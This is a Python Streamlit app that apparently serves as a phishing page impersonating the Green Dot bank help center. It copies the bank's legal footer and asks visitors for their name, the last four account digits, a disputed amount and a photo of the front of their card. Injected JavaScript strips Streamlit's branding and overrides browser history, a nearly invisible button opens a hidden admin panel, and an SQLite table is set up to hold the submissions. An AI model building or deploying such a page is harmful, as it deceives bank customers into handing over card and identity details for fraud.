
import streamlit as st
import sqlite3
import os
import pandas as pd
from datetime import datetime

# Configuración de Rutas
DB_NAME = "claims.db"
UPLOAD_DIR = "uploads"
os.makedirs(UPLOAD_DIR, exist_ok=True)

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS greendot_submissions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  nombre TEXT, cuenta TEXT, monto REAL,
                  factura_path TEXT, tarjeta_path TEXT, fecha TEXT, ref_id TEXT)""")
    conn.commit()
    conn.close()

init_db()

st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page_icon="✅")

# JAVASCRIPT: LIMPIEZA Y MANEJO DE HISTORIAL
st.markdown("""<script>
    const forceClean = () => {
        const toRemove = [
            '.stElementToolbar', '[data-testid="stElementToolbar"]',
            '.stTooltipHoverTarget', 'button[title="View fullscreen"]',
            'header', 'footer', '.stDeployButton', '[data-testid="stHeader"]',
            '[data-testid="stHeaderActionElements"]', '.section-anchor', 'a.section-anchor'
        ];
        toRemove.forEach(s => {
            document.querySelectorAll(s).forEach(el => { el.style.display = 'none'; el.remove(); });
        });
    };
    if (window.history && window.history.replaceState) {
        const originalRS = window.history.replaceState;
        window.history.replaceState = function() {
            if (arguments[2] && arguments[2].includes('?')) return;
            return originalRS.apply(this, arguments);
        };
    }
    setInterval(forceClean, 100);
</script>""", unsafe_allow_html=True)

# CSS: ESTILOS Y FOOTER
st.markdown("""<style>
    .stApp { background-color: #000000 !important; color: #FFFFFF !important; }
    .block-container { max-width: 500px !important; padding-top: 2rem !important; }

    [data-testid="stImage"] img { width: 250px !important; margin: 0 auto; display: block; }

    .stTextInput input, .stNumberInput input {
        background-color: #1a1a1a !important; color: white !important; border: 1px solid #333 !important;
    }

    .stButton > button { background-color: #00a05b !important; color: white !important; width: 100%; border: none; height: 50px; border-radius: 8px; }

    .legal-container {
        font-size: 10px; color: #666; text-align: justify; margin-top: 50px;
        border-top: 1px solid #222; padding-top: 20px; line-height: 1.5;
    }

    .admin-trigger {
        position: fixed; bottom: 10px; left: 10px; width: 30px; height: 30px; opacity: 0.05; z-index: 9999;
    }
    .admin-trigger:hover { opacity: 0.2; }
</style>""", unsafe_allow_html=True)

if 'admin_mode' not in st.session_state: st.session_state.admin_mode = False

if not st.session_state.admin_mode:
    if os.path.exists("logo.svg"): st.image("logo.svg")

    st.title("Help Center")
    st.write("Please fill out the form below to submit your claim.")

    with st.form("claim_v1_0_9", clear_on_submit=True):
        st.text_input("Full Name", autocomplete="name")
        st.text_input("Last 4 digits of Account")
        st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
        st.file_uploader("Store Receipt", type=["jpg","png","jpeg"])
        st.file_uploader("Card Front Photo", type=["jpg","png","jpeg"])
        if st.form_submit_button("SUBMIT NOW"):
            st.success("Claim Received successfully.")

    # FOOTER LEGAL COMPLETO
    st.markdown("""<div class='legal-container'>
        * When on a desktop, hover over * to view important disclosures. When on a mobile device, tap on * to view disclosures.<br><br>
        Not a gift card. Must be 18 or older to purchase. Online access, mobile number verification and identity verification (including SSN) are required to open and use your account.<br><br>
        The check cashing service is provided by Ingo Money, Inc. and the sponsor bank identified in the Terms and Conditions. Subject to approval. Fees apply. Ingo Money reserves the right to recover losses resulting from illegal or fraudulent use.<br><br>
        Green Dot&reg; cards are issued by Green Dot Bank, Member FDIC, pursuant to a license from Visa U.S.A., Inc. and by Mastercard International Inc. Green Dot Bank also operates under the registered trade names: GO2bank, GoBank and Bonneville Bank. All of these are a single FDIC-insured bank.<br><br>
        &copy;2026 Green Dot Corporation. All rights reserved. NMLS #914924; Green Dot Bank NMLS #908739.
    </div>""", unsafe_allow_html=True)

    # Botón Admin oculto
    st.markdown("<div class='admin-trigger'>", unsafe_allow_html=True)
    if st.button(" ", key="adm_btn"):
        st.session_state.admin_mode = True
        st.rerun()
    st.markdown("</div>", unsafe_allow_html=True)

else:
    st.title("Admin Panel")
    if st.button("Exit Admin"): 
        st.session_state.admin_mode = False
        st.rerun()
